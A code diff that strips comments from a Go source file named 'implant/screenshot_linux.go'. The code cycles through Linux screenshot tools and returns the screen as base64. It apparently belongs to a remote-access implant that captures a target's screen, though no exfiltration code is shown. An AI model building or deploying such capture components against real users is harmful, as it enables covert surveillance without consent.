@@ -1,4 +1,3 @@
-// implant/screenshot_linux.go
 //go:build linux
 
 package main
@@ -13,11 +12,10 @@ import (
 )
 
 func init() {
-	// Assign the Linux-specific implementation to the global takeScreenshot variable.
+
 	takeScreenshot = linuxTakeScreenshot
 }
 
-// linuxScreenshotUtility defines a structure for trying different screenshot tools.
 type linuxScreenshotUtility struct {
 	name         string
 	cmd          string
@@ -25,7 +23,6 @@ type linuxScreenshotUtility struct {
 	argsToFile   []string // Arguments to make the tool save to a file. Filename will be appended.
 }
 
-// List of screenshot utilities to try on Linux, in order of preference.
 var linuxScreenshotUtilities = []linuxScreenshotUtility{
 	{
 		name:         "grim (Wayland)",
@@ -64,9 +61,6 @@ var linuxScreenshotUtilities = []linuxScreenshotUtility{
 	},
 }
 
-// linuxTakeScreenshot attempts to capture the entire screen on Linux.
-// It iterates through a list of known screenshot utilities and tries to use them.
-// Returns a base64 encoded string of the PNG image or an error.
 func linuxTakeScreenshot() (string, error) {
 	var lastErr error
 
